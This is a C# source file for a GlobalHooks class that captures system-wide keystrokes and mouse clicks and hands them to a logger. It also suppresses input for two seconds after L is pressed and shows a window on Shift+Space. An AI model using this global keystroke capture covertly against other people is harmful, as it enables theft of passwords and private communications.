using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System;

namespace GlobalHooks
{
    public class GlobalHooks
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly Logger _logger;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;
        private  System.Threading.Timer _timer;
        public static bool Flag = true;

        public GlobalHooks(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logger = new Logger(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
        }
        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (_settings.isHooks)
            {
                if (e.KeyData == (Keys.L))
                {
                    Flag = false;
                    _timer = new System.Threading.Timer(RollBack, null, 2000, 0);
                }
                e.SuppressKeyPress = !Flag;
                _logger.KeyLogger(e.KeyData.ToString());
            }
            if (e.KeyData == (Keys.Space | Keys.Shift))
            {
               _windowShow?.Invoke();
            }
        }
        
        public static void RollBack(object e)
        {
            Flag = true;
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.isHooks)
            {
                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}